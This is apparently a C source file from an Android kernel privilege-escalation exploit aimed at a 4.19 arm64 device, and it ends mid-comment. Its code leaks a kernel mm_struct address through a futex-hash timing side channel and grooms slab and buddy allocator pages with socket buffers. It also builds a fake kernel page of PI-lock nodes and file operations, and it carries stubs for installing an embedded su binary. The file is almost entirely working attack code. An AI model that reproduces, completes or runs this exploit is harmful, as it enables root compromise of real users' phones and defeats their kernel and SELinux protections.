#include "common.h"
#include "kernelsnitch/kernelsnitch.h"
#include "kernel_page.h"
#include "kernel_page/gate.h"
#include "kernel_page/run_state.h"
#include "kernel_page/address_cache.h"
#include "kernel_page/identity.h"
#include <dirent.h>

/* The emptying free must run on a CPU whose c->page is not base, or
 * do_slab_free takes the fastpath and never reaches __slab_free. */
#define EMPTYING_CPU 1
/* Image frags queued immediately after the emptying free.  Each send is one
 * 3712-byte linear head plus one order-3 frag page, so each consumes exactly
 * one position of the order-3 free-list head.  The free is the last thing
 * this thread does before the sends, so position 0 is base unless the block
 * merged with its order-3 buddy; positions 1.. cover that merge (an
 * upper-half base is returned by the second pop of the split order-4 block)
 * and any foreign order-3 free that lands above base in the same window. */
#define IMAGE_SENDS 3

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
/* The single owner of the controlled page: the bytes we send, the kernel
 * page the frag half maps into, and the qwords the kernel must see there.
 * prepare_skb_payload() is the only writer; page_image_report() is the only
 * reader.  It is the one place that knows the buffer-to-page mapping. */
struct page_image {
  unsigned char *buf;   /* SKB_SEND_SIZE bytes, offset 0 is page offset 0 */
  uintptr_t base;       /* kernel address of the frag page (the order-3 slab) */
  size_t bias;          /* SKB_FRAG_BIAS: buffer offset that maps to page 0 */
  int mode;
  int built;
  uint64_t want_rb;
  uint64_t want_leftmost;
  uint64_t want_owner;
  uint64_t want_w0_lock;
  uint64_t want_blocked;
};
static struct page_image page_image;

static uint64_t image_q64(size_t off) {
  uint64_t v = 0;
  if (page_image.buf != NULL &&
      page_image.bias + off + sizeof(v) <= SKB_SEND_SIZE) {
    memcpy(&v, page_image.buf + page_image.bias + off, sizeof(v));
  }
  return v;
}

static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static struct mm_ctx lead_ctx;
static pid_t child_leak;
static uintptr_t cached_leaked_mm;
/* Set when a preparation attempt died in collision finding or the mm leak.
 * Retrying that path re-creates thousands of piled waiters and was observed to
 * take the device down (2026-10-30 reboot at "prepare_kernel_page retry 1/8"),
 * so a leak failure must fail closed instead of re-entering it. */
static int leak_stage_failed;
/* Set when the target slab's discard could not be attributed to the target's
 * own last free.  The caller must not fire the punch at a page that is still
 * part of the mm cache, so this fails closed instead of retrying. */
static int ks_discard_failed;
static int slab_base_candidate;
int ks_leak_walk_touched;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

uintptr_t g_direct_map_end = DIRECT_MAP_END;
uintptr_t g_direct_map_base = DIRECT_MAP_BASE;
uintptr_t g_linear_map_delta = 0;
uintptr_t g_leak_target = 0;
static size_t g_ram_bytes;
static long burst_boundary_slabs;
static long burst_after_slabs = -1;
static size_t burst_slots;
static int burst_span_ok = -1;
static long burst_boundary_num = -1;
/* Children that complete the cache's cached partial pages and then fill
 * whole fresh slabs.  Each push into c->partial needs a slab with no free
 * object at all, so the population must first consume the cache's free
 * objects (measured ~250-300 on this device) and only then start creating
 * full slabs. */
#define KS_FREEZER_DRAIN 1024
static pid_t fz_drain[KS_FREEZER_DRAIN];
static size_t fz_i;
static long burst_after_num = -1;
/* One page per cpu_partial slot plus the crossing push. */
static int burst_empty_cpu = -1;
/* Control slab: a second verified 32-slot burst from the same cache, never
 * scanned and never a punch target.  It runs the identical freeze/crossing/
 * escaped-empty sequence in the same cycle, so its discard proves the
 * machinery and its refusal proves the leak address is not the slab the
 * payload built. */
static pid_t control_childs[64];
static size_t control_cnt;
static pid_t control_last = -1;
/* Order-3 pages held with queued AF_UNIX skbs across the emptying free.  The
 * count is what the kernel actually allocated, not an assertion: it is 0 when
 * the hold failed. */
static int *buddy_hold_fds;
static size_t buddy_hold_n;
/* Every mm-bearing child reports the CPU it actually pinned to, so the
 * payload can prove each free runs on the CPU whose partial list the
 * crossing drains instead of assuming it. */
#define KS_PIN_SLOTS 1024
static int pin_rw[2] = {-1, -1};
static int pin_seen[KS_PIN_SLOTS];
static int pin_reports;
static int pin_slot_next;
static int pin_slot_of_last = -1;
static int pin_bad;
static int slot_partial;
static long slot_a0, slot_a1, slot_s0, slot_s1;
static int pre_slots[64];
static int ctl_slots[64];

/* The child reports the CPU its pin produced through a pipe: a shared
 * anonymous mapping did not become visible to the parent, and a MAP_PRIVATE
 * copy would silently look pinned. */
static void pin_drain(void) {
  if (pin_rw[0] < 0) {
    return;
  }
  for (;;) {
    int rep[2];
    ssize_t n = read(pin_rw[0], rep, sizeof(rep));
    if (n != (ssize_t)sizeof(rep)) {
      break;
    }
    if (rep[0] >= 0 && rep[0] < KS_PIN_SLOTS) {
      pin_seen[rep[0]] = rep[1];
      pin_reports++;
    }
  }
}

/* Per-allocation slab evidence: a new slab adds its objects off-list, so the
 * active count jumps by the whole slab; an object taken from an existing
 * partial slab raises active by one; an object from the slab just built
 * changes nothing.  Any "partial" slot means the burst is not exclusive. */
static void mm_slot_probe(const char *tag, size_t i, long a0, long s0,
                          long a1, long s1, int *partial) {
  long da = a1 - a0;
  long ds = s1 - s0;
  const char *cls;
  if (ds > 0) {
    cls = "new";
  } else if (da == 0) {
    cls = "same";
  } else if (da > 0) {
    cls = "partial";
    if (partial != NULL) {
      (*partial)++;
    }
  } else {
    cls = "other";
  }
  pr_info("KS_SLOT tag=%s i=%zu slabs=%ld->%ld active=%ld->%ld da=%ld "
          "ds=%ld cls=%s\n", tag, i, s0, s1, a0, a1, da, ds, cls);
}

static int read_boot_id(char *buf, size_t len) {
  return kp_boot_id_read(buf, len);
}


static const char *select_ks_cache_path(int write) {
  return kp_cache_select(write);
}

static size_t ks_cache_radius_bytes(void) {
  return kp_cache_radius_bytes();
}

static int ks_cache_load(uintptr_t *anchor, char *boot_id, size_t boot_len) {
  const char *path;
  FILE *f;
  enum kp_cache_status st;

  if (!kp_boot_id_read(boot_id, boot_len)) return 0;
  path = kp_cache_select(0);
  if (!path) return 0;
  f = fopen(path, "r");
  if (!f) return 0;
  st = kp_cache_parse(f, boot_id, (uintptr_t)g_direct_map_base,
                      (uintptr_t)g_direct_map_end, anchor);
  fclose(f);
  return st == KP_CACHE_OK;
}

static void ks_cache_save(uintptr_t anchor) {
  const char *path;
  char boot_id[128];
  char text[256];
  FILE *f;
  int n;

  if (anchor < g_direct_map_base || anchor >= g_direct_map_end) return;
  if (!kp_boot_id_read(boot_id, sizeof(boot_id))) return;
  path = kp_cache_select(1);
  if (!path) return;
  n = kp_cache_format(text, sizeof(text), boot_id, anchor,
                      (uintptr_t)g_direct_map_base,
                      (uintptr_t)g_direct_map_end);
  if (n <= 0) return;
  f = fopen(path, "w");
  if (!f) {
    pr_warning("KS_CACHE save failed path=%s\n", path);
    return;
  }
  fwrite(text, 1, (size_t)n, f);
  fclose(f);
  pr_info("KS_CACHE save path=%s anchor=%016zx\n", path, anchor);
}

__attribute__((unused))
static int linear_delta_index(void) {
  const char *env = getenv("GHOSTLOCK_DELTA_INDEX");
  if (env && *env) {
    return atoi(env);
  }

  /* PC keeps this file world-writable and updates it between candidate
   * runs; an app cannot create files in /data/local/tmp, so it only reads
   * an already-created file and defaults to index 0. */
  FILE *f = fopen("/data/local/tmp/ks_delta_index.txt", "r");
  if (!f) {
    return 0;
  }
  char line[32] = "";
  if (!fgets(line, sizeof(line), f)) {
    fclose(f);
    return 0;
  }
  fclose(f);
  return atoi(line);
}

/* The kernel computes VA(phys) = PAGE_OFFSET + phys - memstart_addr.  For a
 * leaked mm at mm_va, every 1GB-aligned memstart that maps mm_va back into
 * alioth's RAM gives exactly one linear-map delta.  CFI step=4 is the
 * on-device oracle for which candidate is real. */
void select_linear_map_delta(uintptr_t mm_va) {
  /* Offline source verification (memory.h:185,280): 4.19 arm64 still uses
   * PHYS_OFFSET == memstart_addr, and memstart_addr can be randomized.
   * Until we can read memstart_addr, allow KS_LINEAR_DELTA to override the
   * 0 default for targeted validation instead of silently dropping it. */
  const char *delta_env = getenv("KS_LINEAR_DELTA");
  if (delta_env && *delta_env) {
    g_linear_map_delta = (uintptr_t)strtoll(delta_env, NULL, 0);
    pr_info("KS_DELTA override delta=%016zx mm=%016zx\n",
            g_linear_map_delta, mm_va);
    return;
  }
  pr_info("KS_DELTA delta=0 default (mm offset=%016zx)\n",
          (size_t)(mm_va - P0_PAGE_OFFSET));
  g_linear_map_delta = 0;
}

static void set_ks_window(uintptr_t anchor, int hit) {
  size_t radius = ks_cache_radius_bytes();
  uintptr_t start = g_direct_map_base;
  uintptr_t end = g_direct_map_end;
  const char *scan_start = getenv("KS_MM_START");
  const char *scan_end = getenv("KS_MM_END");
  if (scan_start && *scan_start && scan_end && *scan_end) {
    uintptr_t env_start = (uintptr_t)strtoull(scan_start, NULL, 0);
    uintptr_t env_end = (uintptr_t)strtoull(scan_end, NULL, 0);
    if (env_start < env_end && env_start >= g_direct_map_base &&
        env_end <= g_direct_map_end) {
      ks->identity_start = env_start;
      ks->identity_end = env_end;
      pr_info("KS_MM_SCAN override start=%016zx end=%016zx\n", env_start, env_end);
      return;
    }
  }
  if (hit && anchor >= g_direct_map_base + radius)
    start = anchor - radius;
  if (hit && anchor <= g_direct_map_end - radius)
    end = anchor + radius;
  ks->identity_start = start;
  ks->identity_end = end;
  if (hit) {
    const char *cache_path = kp_cache_select(0);
    pr_info("KS_CACHE hit path=%s anchor=%016zx start=%016zx end=%016zx radius=%zuGB\n",
            cache_path != NULL ? cache_path : "?", anchor, start, end,
            radius >> 30);
  }
}

/* read RAM size from /proc/meminfo so the physmap scan never walks (and never
 * reports) physical addresses that do not exist on this device */
static void detect_memory(void) {
  if (g_ram_bytes) {
    return;
  }
  size_t kb = 0;
  FILE *f = fopen("/proc/meminfo", "r");
  if (f) {
    char line[256];
    while (fgets(line, sizeof(line), f)) {
      unsigned long long v = 0;
      if (sscanf(line, "MemTotal: %llu kB", &v) == 1) {
        kb = (size_t)v;
        break;
      }
    }
    fclose(f);
  }
  if (!kb) {
    kb = 8ULL * 1024 * 1024;  /* conservative default 8 GB */
  }
  size_t bytes = kb * 1024;
  if (bytes < (1ULL << 30)) bytes = 1ULL << 30;
  if (bytes > (32ULL << 30)) bytes = 32ULL << 30;
  /* round up to 1 GB */
  bytes = (bytes + ((1ULL << 30) - 1)) & ~((1ULL << 30) - 1);
  g_ram_bytes = bytes;
  /* 4.19 arm64 uses the fixed PHYS_OFFSET/PAGE_OFFSET mapping.  The 256GB
   * region exists only as a compiler-time limit; real kernel objects live
   * in the physical RAM window. */
  g_direct_map_base = P0_PAGE_OFFSET;
  g_direct_map_end = P0_PAGE_OFFSET + g_ram_bytes;
  pr_info("memory detected ram=0x%zx (%zu GB) window_end=%016zx\n",
          g_ram_bytes, g_ram_bytes >> 30, (size_t)g_direct_map_end);
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  detect_memory();
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);  /* verbose diagnostics for on-device debug */
  ks->identity_end = (size_t)g_direct_map_end;
  const char *scan_start = getenv("KS_MM_START");
  const char *scan_end = getenv("KS_MM_END");
  if (scan_start && *scan_start && scan_end && *scan_end) {
    uintptr_t start = (uintptr_t)strtoull(scan_start, NULL, 0);
    uintptr_t end = (uintptr_t)strtoull(scan_end, NULL, 0);
    if (start < end && start >= g_direct_map_base && end <= g_direct_map_end) {
      ks->identity_start = start;
      ks->identity_end = end;
      pr_info("KS_MM_SCAN override start=%016zx end=%016zx\n", start, end);
    }
  }
  const char *delta_str = getenv("KS_LINEAR_DELTA");
  if (delta_str && *delta_str) {
    g_linear_map_delta = strtoull(delta_str, NULL, 0);
    pr_info("linear_map delta override=0x%016zx\n", g_linear_map_delta);
  }
  ks->ram_bytes = g_ram_bytes;
}

/* Verdict of the scan that clone_leak_child() runs in the forked child. */
int kernelsnitch_mm_ready(void) {
  return ks != NULL && ks->state == KERNELSNITCH_MM_FOUND;
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

/* candidate SLUB object sizes for the mm_struct cache (ALIGN to cacheline).
 * 0x340 was verified on-device (K40/SD870-class 4.19). */
static const size_t ksnitch_mm_sizes[] = {
  0x340, 0x380, 0x358, 0x400, 0x360, 0x300, 0x3c0, 0x480,
};
/* The vendor kernel randomizes the linear map (RANDOMIZE_BASE backport), so
 * A 7/7 futex-hash agreement is self-validating; only check that the
 * candidate lies inside the 4.19 256GB linear region. */
static int mm_plausible(size_t mm) {
  if (mm < g_direct_map_base || mm >= (size_t)g_direct_map_end) {
    return 0;
  }
  /* 4.19 arm64 uses a fixed PAGE_OFFSET/PHYS_OFFSET mapping.  A leaked
   * mm whose linear offset exceeds physical RAM cannot be real and must
   * not be fed into the exploit page, where it would create wild PI
   * nodes. */
  if ((mm - P0_PAGE_OFFSET) >= g_ram_bytes) {
    return 0;
  }
  return 1;
}

/* Export the collision futex addresses so a PC worker can search the whole
 * 256GB linear map in parallel; the device then only polls for the answer. */
static void ks_export_collisions(const char *boot_id) {
  char path[256];
  FILE *f;
  const char *timings_path;
  FILE *tf;
  snprintf(path, sizeof(path), "/data/local/tmp/ks_collisions.txt");
  /* Untrusted-app context cannot create files in /data/local/tmp, so the
   * helper pre-creates a world-writable file; write in place (no tmp+rename). */
  f = fopen(path, "w");
  if (!f) {
    pr_warning("KS_PC export failed path=%s\n", path);
    return;
  }
  fprintf(f, "boot_id=%s\n", boot_id);
  fprintf(f, "futex_hashsize=0x%lx\n", (unsigned long)futex_hashsize);
  fprintf(f, "configured_collisions=%zu\n", ks->collisions);
  fprintf(f, "accepted_collisions=%zu\n", (size_t)ks->accepted_count);
  fprintf(f, "candidate_count=%zu\n",
          (size_t)ks->candidate1_count + (size_t)ks->candidate2_count);
  for (size_t i = 0; i < ks->accepted_count; ++i) {
    size_t idx = (size_t)ks->accepted_idx[i];
    size_t slot = idx / KS_PAGE_SIZE;
    if (i == 0) {
      fprintf(f, "collision_addr=0x%016zx t_before=%zu t_after=%zu\n",
              (size_t)ks->futex_addrs[i], (size_t)ks->t_before[0],
              (size_t)ks->times[0]);
    } else {
      fprintf(f, "collision_addr=0x%016zx t_before=%zu t_after=%zu\n",
              (size_t)ks->futex_addrs[i], (size_t)ks->t_before[slot],
              (size_t)ks->times[slot]);
    }
  }
  for (size_t i = 0; i < ks->candidate1_count; ++i) {
    size_t idx = (size_t)ks->candidate1_idx[i];
    size_t slot = idx / KS_PAGE_SIZE;
    fprintf(f,
            "candidate_addr=0x%016zx pile=1 t_before=%zu t_after=%zu\n",
            (size_t)&ks->futexes[idx], (size_t)ks->t_before[slot],
            (size_t)ks->times[slot]);
  }
  for (size_t i = 0; i < ks->candidate2_count; ++i) {
    size_t idx = (size_t)ks->candidate2_idx[i];
    size_t slot = idx / KS_PAGE_SIZE;
    fprintf(f,
            "candidate_addr=0x%016zx pile=2 t_before=%zu t_after=%zu\n",
            (size_t)&ks->futexes[idx], (size_t)ks->t_before2[slot],
            (size_t)ks->times2[slot]);
  }
  fclose(f);
  pr_info("KS_PC export path=%s accepted=%zu candidates=%zu/%zu hashsize=0x%lx\n",
          path, (size_t)ks->accepted_count, (size_t)ks->candidate1_count,
          (size_t)ks->candidate2_count, (unsigned long)futex_hashsize);

  timings_path = getenv("KS_TIMINGS");
  if (timings_path && *timings_path) {
    tf = fopen(timings_path, "w");
    if (tf) {
      fprintf(tf, "boot_id=%s\n", boot_id);
      fprintf(tf, "futex_hashsize=0x%lx\n", (unsigned long)futex_hashsize);
      fprintf(tf, "total=%zu\n", ks->total_futexes);
      for (size_t i = 2; i < ks->total_futexes; ++i) {
        fprintf(tf, "%zu 0x%016zx %zu %zu\n", i,
                (size_t)&ks->futexes[(i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE)],
                (size_t)ks->t_before[i], (size_t)ks->times[i]);
      }
      fclose(tf);
      pr_info("KS_TIMINGS export path=%s rows=%zu\n", timings_path,
              ks->total_futexes - 2);
    } else {
      pr_warning("KS_TIMINGS export failed path=%s\n", timings_path);
    }
  }
}

/* Read a PC-provided mm answer; only accept 64B-aligned alioth linear-map
 * VAs so a stale/corrupt file can't poison the exploit. */
static int ks_pc_answer_read(uintptr_t *out) {
  FILE *f = fopen("/data/local/tmp/ks_mm_answer.txt", "r");
  unsigned char buf[64];
  size_t n;
  uintptr_t mm = 0;
  enum kp_answer_status st;

  if (!f) return 0;
  /* Strict wire format: the whole file must be exactly
   * "mm=0x" + 16 lowercase hex digits + LF (22 bytes), or the same
   * payload with CRLF (23 bytes) for compatibility with older Windows
   * text-mode writers. Anything else (partial write, NUL padding,
   * stale data) is rejected instead of parsed. */
  n = fread(buf, 1, sizeof(buf), f);
  fclose(f);
  st = kp_answer_parse((const char *)buf, n, (uintptr_t)g_direct_map_base,
                       (uintptr_t)g_direct_map_end, (uintptr_t)P0_PAGE_OFFSET,
                       (uint64_t)g_ram_bytes, &mm);
  switch (st) {
    case KP_ANSWER_OK:
      *out = mm;
      return 1;
    case KP_ANSWER_LEN:
      if (n) {
        pr_warning("KS_PC answer rejected len=%zu (expect 22 LF or 23 CRLF)\n",
                   n);
      }
      return 0;
    case KP_ANSWER_FORMAT:
      pr_warning("KS_PC answer rejected format\n");
      return 0;
    case KP_ANSWER_HEX:
      pr_warning("KS_PC answer rejected hex\n");
      return 0;
    case KP_ANSWER_IMPLAUSIBLE:
      pr_warning("KS_PC answer rejected mm=%016zx\n", mm);
      return 0;
  }
  return 0;
}

/* Wait up to KS_PC_WAIT seconds for the PC worker to drop its answer. */
static int ks_pc_wait_answer(uintptr_t *out) {
  const char *env = getenv("KS_PC_WAIT");
  const char *poll_env = getenv("KS_PC_POLL_MS");
  int wait_s = env ? atoi(env) : 60;
  int poll_ms = poll_env ? atoi(poll_env) : 1000;
  if (poll_ms < 250) poll_ms = 250;
  if (poll_ms > 2000) poll_ms = 2000;
  if (wait_s <= 0) return 0;
  pr_info("KS_PC waiting up to %ds poll_ms=%d for %s\n", wait_s, poll_ms,
          "/data/local/tmp/ks_mm_answer.txt");
  int elapsed_ms = 0;
  while (elapsed_ms < wait_s * 1000) {
    if (ks_pc_answer_read(out)) {
      return 1;
    }
    usleep(poll_ms * 1000);
    elapsed_ms += poll_ms;
  }
  return ks_pc_answer_read(out);
}

static int ks_pc_answer_matches_collisions(uintptr_t mm);

/* Called from every scan thread at coarse-block boundaries so a PC answer
 * can short-circuit a local 256GB scan in progress.
 *
 * A plausible answer is not a verified one.  This hook used to accept any
 * well-formed file, so a stale answer from another boot became ks->mm_struct
 * with no hash agreement, was saved as the next run's cache anchor, and then
 * failed the parent's verification on every following cycle (measured:
 * KS_PC answer rejected hash ... i=1 immediately before "KernelSnitch mm
 * found addr=<the same stale value>").  The answer must now reproduce this
 * run's collision agreement before it can end the scan. */
int ks_pc_abort_check(uintptr_t *out) {
  uintptr_t mm = 0;
  if (!ks_pc_answer_read(&mm)) {
    return 0;
  }
  if (ks_pc_answer_matches_collisions(mm) != 1) {
    return 0;
  }
  *out = mm;
  return 1;
}

/* A PC answer is only trusted if it reproduces the bucket agreement of the
 * collisions this run actually measured.  Plausibility alone is not enough:
 * an answer from another process, another boot or a bad solve would point the
 * fake page at an arbitrary object and panic the kernel on the first write.
 * Returns 1 = verified, 0 = rejected, -1 = no collision set to check. */
static int ks_pc_answer_matches_collisions(uintptr_t mm) {
  if (!ks || !ks->futex_addrs || ks->collisions < 2)
    return -1;
  uint32_t want = futex_hash((size_t)ks->futex_addrs[0], mm);
  for (size_t i = 1; i < ks->collisions; ++i) {
    if (futex_hash((size_t)ks->futex_addrs[i], mm) != want) {
      pr_warning("KS_PC answer rejected hash mm=%016zx addr=%016zx i=%zu\n",
                 mm, (size_t)ks->futex_addrs[i], i);
      return 0;
    }
  }
  return 1;
}

void run_kernelsnitch_bruteforce(void) {
  char boot_id[128];
  uintptr_t anchor = 0;
  int hit = ks_cache_load(&anchor, boot_id, sizeof(boot_id));
  if (!hit)
    pr_info("KS_CACHE miss reason=no-valid-cache\n");
  if (kernelsnitch_collisions_ready()) {
    ks_export_collisions(boot_id);
    uintptr_t pc_mm = 0;
    if (ks_pc_wait_answer(&pc_mm) && ks_pc_answer_matches_collisions(pc_mm) == 1) {
      pr_info("KS_PC answer verified mm=%016zx (skipping device scan)\n", pc_mm);
      ks->mm_struct = (size_t)pc_mm;
      ks->found = 1;
      ks->state = KERNELSNITCH_MM_FOUND;
      ks_cache_save((uintptr_t)ks->mm_struct);
      return;
    }
  }
  set_ks_window(anchor, hit);
  kernelsnitch_bruteforce(ks);
  if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
    pr_info("KernelSnitch mm found addr=%016zx sz=0x%zx\n",
            ks->mm_struct, ks->mm_struct_sz);
    ks_cache_save(ks->mm_struct);
    return;
  }
  for (size_t i = 0; i < sizeof(ksnitch_mm_sizes) / sizeof(ksnitch_mm_sizes[0]); ++i) {
    size_t size = ksnitch_mm_sizes[i];
    if (size == ks->mm_struct_sz) continue;
    ks->mm_struct_sz = size;
    ks->mm_struct = (size_t)-1;
    ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    pr_info("KS_MM_SIZE_TRY size=%016zx\n", size);
    kernelsnitch_bruteforce(ks);
    if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
      pr_info("KernelSnitch mm found addr=%016zx sz=0x%zx\n",
              ks->mm_struct, ks->mm_struct_sz);
      ks_cache_save(ks->mm_struct);
      return;
    }
  }
  if (hit) {
    pr_info("KS_CACHE miss reason=scan-failed falling-back=full-256GB\n");
    ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    set_ks_window(0, 0);
    kernelsnitch_bruteforce(ks);
  }
  if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
    pr_info("KernelSnitch mm found addr=%016zx sz=0x%zx\n",
            ks->mm_struct, ks->mm_struct_sz);
    ks_cache_save(ks->mm_struct);
    return;
  }
  pr_warning("KernelSnitch mm_struct leak failed (no size/order sweep)\n");
}

/* Buddy-allocated order-3 slabs are aligned to 2^3 pages, so the mm's
 * containing slab starts at the leaked address truncated to 32KB. */
static uintptr_t select_slab_base(uintptr_t leaked, int candidate) {
  (void)candidate;
  const char *override = getenv("KSLAB_BASE");
  if (override && *override) {
    uintptr_t base = strtoull(override, NULL, 16);
    if (base && base <= leaked &&
        leaked - base < ORDER3_SIZE) {
      return base;
    }
  }
  return leaked & ~((uintptr_t)ORDER3_SIZE - 1);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_OTHER;
  attr.sched_nice = nice_value;
  int ret = (int)syscall(SYS_sched_setattr, tid, &attr, 0);
  int saved = errno;
  if (ret == 0) return 0;
  pr_warning("sched_setattr tid=%d nice=%d ret=%d errno=%d; "
             "falling back to setpriority\n", tid, nice_value, ret, saved);
  /* Fallback: setpriority(PRIO_PROCESS, tid, nice) is simpler and
   * triggers the same PI chain walk via __sched_setscheduler. */
  errno = 0;
  ret = setpriority(PRIO_PROCESS, tid, nice_value);
  if (ret != 0) {
    pr_warning("setpriority tid=%d nice=%d ret=%d errno=%d\n",
               tid, nice_value, ret, errno);
  }
  return ret;
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  /* Linear-map randomization: memstart_addr shifts every phys→VA
   * translation by a constant.  We can't read memstart_addr, but we can
   * compute the delta from the KernelSnitch mm address: the kernel data
   * (fops) and the mm struct are both in the same contiguous linear map,
   * so data_va = mm_va - (mm_phys - data_phys).  We approximate by
